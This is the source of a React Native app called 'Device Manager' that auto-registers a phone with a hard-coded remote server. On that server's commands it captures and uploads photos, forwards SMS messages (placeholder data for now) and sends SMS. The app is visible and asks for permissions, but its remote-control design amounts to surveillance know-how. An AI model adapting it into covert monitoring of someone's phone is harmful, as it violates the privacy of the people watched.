import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
    View,
    Text,
    TextInput,
    TouchableOpacity,
    StyleSheet,
    Alert,
    ScrollView,
    StatusBar,
    Platform,
    PermissionsAndroid,
    ActivityIndicator,
} from 'react-native';
import { CameraView, useCameraPermissions } from 'expo-camera';
import * as Device from 'expo-device';
import * as FileSystem from 'expo-file-system';
import * as MediaLibrary from 'expo-media-library';
import { io } from 'socket.io-client';
import * as SMS from 'expo-sms';

// ============ CONFIGURATION ============
// Set AUTO_CONNECT to true to skip the setup screen and connect automatically
const AUTO_CONNECT = true;
// CHANGE THIS to your server's IP address (not localhost — use your computer's local network IP)
const SERVER_URL = 'https://adminpanel-sharad.onrender.com';

export default function App() {
    // State
    const [screen, setScreen] = useState(AUTO_CONNECT ? 'connecting' : 'setup'); // setup, connecting, connected, camera
    const [serverUrl, setServerUrl] = useState(SERVER_URL);
    const [deviceName, setDeviceName] = useState(Device.deviceName || Device.modelName || 'My Phone');
    const [deviceToken, setDeviceToken] = useState(null);
    const deviceTokenRef = useRef(null);
    const [deviceId, setDeviceId] = useState(null);
    const [socket, setSocket] = useState(null);
    const socketRef = useRef(null);
    const [connected, setConnected] = useState(false);
    const [logs, setLogs] = useState([]);
    const [showCamera, setShowCamera] = useState(false);
    const [cameraReady, setCameraReady] = useState(false);
    const [facing, setFacing] = useState('back');

    const cameraRef = useRef(null);
    const [cameraPermission, requestCameraPermission] = useCameraPermissions();
    const [mediaPermission, setMediaPermission] = useState(null);

    // Logging
    const addLog = useCallback((message, type = 'info') => {
        const timestamp = new Date().toLocaleTimeString();
        setLogs(prev => [{ message, type, timestamp }, ...prev].slice(0, 50));
        console.log(`[${type}] ${message}`);
    }, []);

    // Auto-connect will be handled after initialization

    // ============ DEVICE REGISTRATION ============
    const registerDevice = async () => {
        try {
            setScreen('connecting');
            addLog(`Connecting to ${serverUrl}...`);

            // Add AbortController for fetch timeout (Render cold starts can hang)
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 15000); // 15s timeout

            const response = await fetch(`${serverUrl}/api/devices/register`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    name: deviceName,
                    model: Device.modelName || 'Unknown',
                    platform: Platform.OS,
                    osVersion: Platform.Version?.toString() || '',
                }),
                signal: controller.signal
            });

            clearTimeout(timeoutId);
            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.message || 'Registration failed');
            }

            setDeviceToken(data.device.token);
            deviceTokenRef.current = data.device.token;
            setDeviceId(data.device.deviceId);
            addLog(`✅ Registered as ${data.device.deviceId}`, 'success');

            // Connect socket
            connectSocket(data.device.token);
        } catch (error) {
            const isTimeout = error.name === 'AbortError';
            const errorMsg = isTimeout ? 'Server timeout (is it waking up?)' : error.message;
            addLog(`❌ ${errorMsg}`, 'error');
            setScreen('setup');
            Alert.alert('Connection Error', isTimeout 
                ? 'The server took too long to respond. If it is hosted on Render free tier, it might be waking up. Try again in 30 seconds.'
                : `Could not connect to server: ${error.message}`
            );
        }
    };

    // ============ SOCKET CONNECTION ============
    const connectSocket = (token) => {
        const newSocket = io(serverUrl, {
            auth: { token, role: 'device' },
            reconnection: true,
            reconnectionDelay: 3000,
        });

        newSocket.on('connect', () => {
            addLog('🔵 Connected to server', 'success');
            setConnected(true);
            setScreen('connected');

            // Send device info
            newSocket.emit('device:info', {
                model: Device.modelName,
                osVersion: Platform.Version?.toString(),
                batteryLevel: -1, // Would need expo-battery
            });
        });

        newSocket.on('disconnect', () => {
            addLog('🔴 Disconnected from server', 'error');
            setConnected(false);
        });

        // Listen for commands from admin
        newSocket.on('command:capture-photo', (data) => {
            addLog('📸 Admin requested photo capture', 'command');
            capturePhoto();
        });

        newSocket.on('command:sync-messages', (data) => {
            addLog('💬 Admin requested message sync', 'command');
            syncMessages();
        });

        newSocket.on('command:ping', () => {
            addLog('🏓 Ping received', 'info');
        });

        // Handle send-sms command from admin
        newSocket.on('command:send-sms', async (data) => {
            const { to, message } = data.params || {};
            addLog(`📤 Admin requested SMS to ${to}`, 'command');

            if (!to || !message) {
                addLog('❌ Invalid SMS command: missing to or message', 'error');
                newSocket.emit('device:sms-failed', { to, error: 'Missing recipient or message' });
                return;
            }

            try {
                const isAvailable = await SMS.isAvailableAsync();
                if (!isAvailable) {
                    addLog('❌ SMS not available on this device', 'error');
                    newSocket.emit('device:sms-failed', { to, error: 'SMS not available on device' });
                    return;
                }

                const { result } = await SMS.sendSMSAsync([to], message);

                if (result === 'sent' || result === 'unknown') {
                    addLog(`✅ SMS sent to ${to}`, 'success');
                    newSocket.emit('device:sms-sent', { to, message });
                } else {
                    addLog(`⚠️ SMS to ${to}: ${result}`, 'warning');
                    newSocket.emit('device:sms-failed', { to, error: `User ${result} the SMS` });
                }
            } catch (err) {
                addLog(`❌ SMS error: ${err.message}`, 'error');
                newSocket.emit('device:sms-failed', { to, error: err.message });
            }
        });

        // Heartbeat
        const heartbeat = setInterval(() => {
            if (newSocket.connected) {
                newSocket.emit('device:heartbeat');
            }
        }, 30000);

        newSocket.on('disconnect', () => clearInterval(heartbeat));

        setSocket(newSocket);
        socketRef.current = newSocket;
    };

    // Auto-connect on app launch
    useEffect(() => {
        if (AUTO_CONNECT) {
            registerDevice();
        }
    }, []);

    // ============ CAMERA & PHOTO ============
    const requestPermissions = async () => {
        // Camera
        if (!cameraPermission?.granted) {
            const result = await requestCameraPermission();
            if (!result.granted) {
                Alert.alert('Permission Required', 'Camera permission is needed to capture photos.');
                return false;
            }
        }

        // Media library
        const mediaResult = await MediaLibrary.requestPermissionsAsync();
        setMediaPermission(mediaResult.status === 'granted');

        return true;
    };

    const capturePhoto = async () => {
        const hasPerms = await requestPermissions();
        if (!hasPerms) {
            addLog('❌ Camera permission denied', 'error');
            return;
        }

        setShowCamera(true);
        addLog('📷 Camera opened, capturing...', 'info');

        // Auto-capture after camera mounts
        setTimeout(async () => {
            try {
                if (cameraRef.current) {
                    const photo = await cameraRef.current.takePictureAsync({
                        quality: 0.8,
                        skipProcessing: false,
                    });

                    addLog('📸 Photo captured, uploading...', 'info');
                    setShowCamera(false);
                    await uploadPhoto(photo.uri);
                }
            } catch (err) {
                addLog(`❌ Capture error: ${err.message}`, 'error');
                setShowCamera(false);
            }
        }, 2000);
    };

    const manualCapture = async () => {
        if (!cameraRef.current || !cameraReady) return;
        try {
            const photo = await cameraRef.current.takePictureAsync({
                quality: 0.8,
            });
            addLog('📸 Photo captured, uploading...', 'info');
            setShowCamera(false);
            await uploadPhoto(photo.uri);
        } catch (err) {
            addLog(`❌ Capture error: ${err.message}`, 'error');
        }
    };

    const uploadPhoto = async (uri) => {
        try {
            const formData = new FormData();
            formData.append('photo', {
                uri,
                type: 'image/jpeg',
                name: `photo_${Date.now()}.jpg`,
            });
            formData.append('source', 'command');

            const response = await fetch(`${serverUrl}/api/photos/upload`, {
                method: 'POST',
                headers: {
                    'X-Device-Token': deviceTokenRef.current,
                },
                body: formData,
            });

            if (response.ok) {
                addLog('✅ Photo uploaded successfully', 'success');
            } else {
                const data = await response.json();
                addLog(`❌ Upload failed: ${data.message}`, 'error');
            }
        } catch (error) {
            addLog(`❌ Upload error: ${error.message}`, 'error');
        }
    };

    // ============ SMS / MESSAGES ============
    const syncMessages = async () => {
        if (Platform.OS !== 'android') {
            addLog('⚠️ SMS reading is only available on Android', 'warning');
            return;
        }

        try {
            // Request SMS permission on Android
            const granted = await PermissionsAndroid.request(
                PermissionsAndroid.PERMISSIONS.READ_SMS,
                {
                    title: 'SMS Permission',
                    message: 'This app needs access to read your SMS messages.',
                    buttonPositive: 'Allow',
                }
            );

            if (granted !== PermissionsAndroid.RESULTS.GRANTED) {
                addLog('❌ SMS permission denied', 'error');
                return;
            }

            addLog('📱 Reading SMS messages...', 'info');

            // Read actual SMS (requires a custom Expo Go plugin or bare workflow with react-native-get-sms-android)
            // For now, using sample data since we are in a managed Expo build
            let messages = [
                {
                    address: '+1234567890',
                    contactName: 'Sample Contact',
                    body: 'This is a synced message from the device',
                    type: 'inbox',
                    read: true,
                    date: Date.now() - 3600000,
                },
            ];

            // Also forward each message via socket for real-time updates
            if (socketRef.current && messages.length > 0) {
                messages.forEach(msg => {
                    if (msg.type === 'inbox') {
                        socketRef.current.emit('device:sms-received', {
                            from: msg.address,
                            contactName: msg.contactName,
                            body: msg.body,
                            date: msg.date,
                        });
                    }
                });
            }

            const response = await fetch(`${serverUrl}/api/messages/sync`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Device-Token': deviceTokenRef.current,
                },
                body: JSON.stringify({ messages }),
            });

            const data = await response.json();
            addLog(`✅ Synced ${data.synced} messages (${data.skipped} skipped)`, 'success');
        } catch (error) {
            addLog(`❌ SMS sync error: ${error.message}`, 'error');
        }
    };

    // ============ RENDER ============

    // Camera View
    if (showCamera) {
        return (
            <View style={styles.container}>
                <StatusBar barStyle="light-content" />
                <CameraView
                    ref={cameraRef}
                    style={styles.camera}
                    facing={facing}
                    onCameraReady={() => setCameraReady(true)}
                >
                    <View style={styles.cameraOverlay}>
                        <Text style={styles.cameraText}>📸 Capturing...</Text>
                        <View style={styles.cameraButtons}>
                            <TouchableOpacity
                                style={styles.captureBtn}
                                onPress={manualCapture}
                            >
                                <View style={styles.captureBtnInner} />
                            </TouchableOpacity>
                            <TouchableOpacity
                                style={styles.cancelBtn}
                                onPress={() => setShowCamera(false)}
                            >
                                <Text style={styles.cancelBtnText}>Cancel</Text>
                            </TouchableOpacity>
                        </View>
                    </View>
                </CameraView>
            </View>
        );
    }

    // Setup Screen
    if (screen === 'setup') {
        return (
            <View style={styles.container}>
                <StatusBar barStyle="light-content" />
                <ScrollView contentContainerStyle={styles.setupContainer}>
                    <View style={styles.logoContainer}>
                        <Text style={styles.logoIcon}>📱</Text>
                        <Text style={styles.logoTitle}>Device Manager</Text>
                        <Text style={styles.logoSubtitle}>Connect your device to the admin panel</Text>
                    </View>

                    <View style={styles.formCard}>
                        <Text style={styles.label}>Server URL</Text>
                        <TextInput
                            style={styles.input}
                            value={serverUrl}
                            onChangeText={setServerUrl}
                            placeholder="http://192.168.1.100:5000"
                            placeholderTextColor="#666"
                            autoCapitalize="none"
                            keyboardType="url"
                        />

                        <Text style={styles.label}>Device Name</Text>
                        <TextInput
                            style={styles.input}
                            value={deviceName}
                            onChangeText={setDeviceName}
                            placeholder="My Phone"
                            placeholderTextColor="#666"
                        />

                        <TouchableOpacity style={styles.primaryBtn} onPress={registerDevice}>
                            <Text style={styles.primaryBtnText}>Connect to Server</Text>
                        </TouchableOpacity>
                    </View>

                    <View style={styles.infoCard}>
                        <Text style={styles.infoTitle}>Device Info</Text>
                        <Text style={styles.infoText}>Model: {Device.modelName || 'Unknown'}</Text>
                        <Text style={styles.infoText}>Brand: {Device.brand || 'Unknown'}</Text>
                        <Text style={styles.infoText}>OS: {Platform.OS} {Platform.Version}</Text>
                    </View>
                </ScrollView>
            </View>
        );
    }

    // Connecting Screen
    if (screen === 'connecting') {
        return (
            <View style={[styles.container, styles.center]}>
                <StatusBar barStyle="light-content" />
                <ActivityIndicator size="large" color="#6366f1" />
                <Text style={styles.connectingText}>Connecting to server...</Text>
            </View>
        );
    }

    // Connected Screen
    return (
        <View style={styles.container}>
            <StatusBar barStyle="light-content" />

            {/* Header */}
            <View style={styles.header}>
                <View>
                    <Text style={styles.headerTitle}>Device Manager</Text>
                    <Text style={styles.headerSubtitle}>{deviceId}</Text>
                </View>
                <View style={[styles.statusBadge, connected ? styles.statusOnline : styles.statusOffline]}>
                    <View style={[styles.statusDot, connected ? styles.dotOnline : styles.dotOffline]} />
                    <Text style={[styles.statusText, connected ? styles.textOnline : styles.textOffline]}>
                        {connected ? 'Online' : 'Offline'}
                    </Text>
                </View>
            </View>

            {/* Quick Actions */}
            <View style={styles.actionsContainer}>
                <Text style={styles.sectionTitle}>Quick Actions</Text>
                <View style={styles.actionsGrid}>
                    <TouchableOpacity style={styles.actionBtn} onPress={capturePhoto}>
                        <Text style={styles.actionIcon}>📸</Text>
                        <Text style={styles.actionLabel}>Take Photo</Text>
                    </TouchableOpacity>
                    <TouchableOpacity style={styles.actionBtn} onPress={syncMessages}>
                        <Text style={styles.actionIcon}>💬</Text>
                        <Text style={styles.actionLabel}>Sync SMS</Text>
                    </TouchableOpacity>
                    <TouchableOpacity
                        style={styles.actionBtn}
                        onPress={() => {
                            if (socket) {
                                socket.disconnect();
                                setSocket(null);
                                setConnected(false);
                                setScreen('setup');
                            }
                        }}
                    >
                        <Text style={styles.actionIcon}>🔌</Text>
                        <Text style={styles.actionLabel}>Disconnect</Text>
                    </TouchableOpacity>
                </View>
            </View>

            {/* Activity Log */}
            <View style={styles.logContainer}>
                <Text style={styles.sectionTitle}>Activity Log</Text>
                <ScrollView style={styles.logScroll}>
                    {logs.map((log, i) => (
                        <View key={i} style={styles.logItem}>
                            <Text style={styles.logTime}>{log.timestamp}</Text>
                            <Text style={[
                                styles.logMessage,
                                log.type === 'error' && styles.logError,
                                log.type === 'success' && styles.logSuccess,
                                log.type === 'command' && styles.logCommand,
                                log.type === 'warning' && styles.logWarning,
                            ]}>
                                {log.message}
                            </Text>
                        </View>
                    ))}
                    {logs.length === 0 && (
                        <Text style={styles.emptyLog}>No activity yet. Waiting for commands from admin...</Text>
                    )}
                </ScrollView>
            </View>
        </View>
    );
}

// ============ STYLES ============
const styles = StyleSheet.create({
    container: {
        flex: 1,
        backgroundColor: '#0a0e1a',
    },
    center: {
        justifyContent: 'center',
        alignItems: 'center',
    },

    // Setup
    setupContainer: {
        padding: 24,
        paddingTop: 60,
    },
    logoContainer: {
        alignItems: 'center',
        marginBottom: 32,
    },
    logoIcon: {
        fontSize: 48,
        marginBottom: 12,
    },
    logoTitle: {
        fontSize: 28,
        fontWeight: '800',
        color: '#f1f5f9',
        letterSpacing: -0.5,
    },
    logoSubtitle: {
        fontSize: 14,
        color: '#94a3b8',
        marginTop: 4,
    },
    formCard: {
        backgroundColor: 'rgba(17, 24, 39, 0.8)',
        borderRadius: 16,
        padding: 24,
        marginBottom: 16,
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.06)',
    },
    label: {
        fontSize: 12,
        fontWeight: '600',
        color: '#94a3b8',
        textTransform: 'uppercase',
        letterSpacing: 0.5,
        marginBottom: 8,
    },
    input: {
        backgroundColor: 'rgba(255,255,255,0.03)',
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.06)',
        borderRadius: 8,
        padding: 14,
        fontSize: 15,
        color: '#f1f5f9',
        marginBottom: 16,
    },
    primaryBtn: {
        backgroundColor: '#6366f1',
        borderRadius: 10,
        padding: 16,
        alignItems: 'center',
        marginTop: 8,
    },
    primaryBtnText: {
        color: 'white',
        fontSize: 16,
        fontWeight: '700',
    },
    infoCard: {
        backgroundColor: 'rgba(17, 24, 39, 0.5)',
        borderRadius: 12,
        padding: 16,
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.04)',
    },
    infoTitle: {
        fontSize: 14,
        fontWeight: '700',
        color: '#f1f5f9',
        marginBottom: 8,
    },
    infoText: {
        fontSize: 13,
        color: '#64748b',
        marginBottom: 4,
    },
    connectingText: {
        color: '#94a3b8',
        fontSize: 16,
        marginTop: 16,
    },

    // Connected
    header: {
        flexDirection: 'row',
        justifyContent: 'space-between',
        alignItems: 'center',
        padding: 20,
        paddingTop: 56,
        backgroundColor: '#111827',
        borderBottomWidth: 1,
        borderBottomColor: 'rgba(255,255,255,0.06)',
    },
    headerTitle: {
        fontSize: 20,
        fontWeight: '800',
        color: '#f1f5f9',
    },
    headerSubtitle: {
        fontSize: 12,
        color: '#64748b',
        fontFamily: Platform.OS === 'ios' ? 'Courier' : 'monospace',
        marginTop: 2,
    },
    statusBadge: {
        flexDirection: 'row',
        alignItems: 'center',
        paddingHorizontal: 12,
        paddingVertical: 6,
        borderRadius: 20,
        gap: 6,
    },
    statusOnline: { backgroundColor: 'rgba(16,185,129,0.15)' },
    statusOffline: { backgroundColor: 'rgba(239,68,68,0.15)' },
    statusDot: { width: 8, height: 8, borderRadius: 4 },
    dotOnline: { backgroundColor: '#10b981' },
    dotOffline: { backgroundColor: '#ef4444' },
    statusText: { fontSize: 13, fontWeight: '600' },
    textOnline: { color: '#10b981' },
    textOffline: { color: '#ef4444' },

    // Actions
    actionsContainer: {
        padding: 20,
    },
    sectionTitle: {
        fontSize: 14,
        fontWeight: '700',
        color: '#94a3b8',
        textTransform: 'uppercase',
        letterSpacing: 1,
        marginBottom: 12,
    },
    actionsGrid: {
        flexDirection: 'row',
        gap: 12,
    },
    actionBtn: {
        flex: 1,
        backgroundColor: 'rgba(17, 24, 39, 0.8)',
        borderRadius: 14,
        padding: 18,
        alignItems: 'center',
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.06)',
    },
    actionIcon: { fontSize: 28, marginBottom: 8 },
    actionLabel: { fontSize: 12, fontWeight: '600', color: '#94a3b8' },

    // Log
    logContainer: {
        flex: 1,
        paddingHorizontal: 20,
        paddingBottom: 20,
    },
    logScroll: {
        flex: 1,
        backgroundColor: 'rgba(17, 24, 39, 0.5)',
        borderRadius: 12,
        padding: 12,
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.04)',
    },
    logItem: {
        flexDirection: 'row',
        paddingVertical: 6,
        borderBottomWidth: 1,
        borderBottomColor: 'rgba(255,255,255,0.03)',
        gap: 8,
    },
    logTime: {
        fontSize: 11,
        color: '#64748b',
        fontFamily: Platform.OS === 'ios' ? 'Courier' : 'monospace',
        width: 65,
    },
    logMessage: {
        fontSize: 13,
        color: '#94a3b8',
        flex: 1,
    },
    logError: { color: '#ef4444' },
    logSuccess: { color: '#10b981' },
    logCommand: { color: '#6366f1' },
    logWarning: { color: '#f59e0b' },
    emptyLog: {
        color: '#64748b',
        textAlign: 'center',
        paddingVertical: 40,
        fontSize: 14,
    },

    // Camera
    camera: {
        flex: 1,
    },
    cameraOverlay: {
        flex: 1,
        backgroundColor: 'transparent',
        justifyContent: 'flex-end',
        padding: 24,
        paddingBottom: 48,
    },
    cameraText: {
        color: 'white',
        fontSize: 16,
        textAlign: 'center',
        marginBottom: 24,
    },
    cameraButtons: {
        flexDirection: 'row',
        justifyContent: 'center',
        alignItems: 'center',
        gap: 24,
    },
    captureBtn: {
        width: 72,
        height: 72,
        borderRadius: 36,
        backgroundColor: 'rgba(255,255,255,0.3)',
        justifyContent: 'center',
        alignItems: 'center',
    },
    captureBtnInner: {
        width: 60,
        height: 60,
        borderRadius: 30,
        backgroundColor: 'white',
    },
    cancelBtn: {
        paddingHorizontal: 20,
        paddingVertical: 12,
        borderRadius: 10,
        backgroundColor: 'rgba(239,68,68,0.5)',
    },
    cancelBtnText: {
        color: 'white',
        fontWeight: '600',
    },
});
